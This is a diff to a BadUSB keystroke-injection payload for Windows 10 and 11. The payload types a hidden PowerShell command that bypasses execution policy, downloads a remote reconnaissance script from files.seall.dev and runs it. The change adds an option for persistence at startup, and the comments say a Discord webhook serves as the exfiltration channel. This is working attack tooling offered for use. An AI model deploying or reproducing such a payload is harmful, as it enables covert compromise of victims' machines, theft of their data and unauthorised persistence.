@@ -8,8 +8,9 @@ REM	Target: Windows 10, 11
 
 GUI r
 DELAY 500
-STRING powershell -Nop -Noni -w h -ep bypass $dc='';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex
+STRING powershell -Nop -Noni -w h -ep bypass $dc=''$pers='True';irm https://files.seall.dev/badusb/SeallDEV+jakoby-RECON.ps1 | iex
 ENTER
 
 REM     Fill in the variable to set your exfil method.
 REM     $dc is the variable that holds your Discord webhook.  
+rem     $pers is the option for persistance, to autorun on startup, set to 'True' to enable
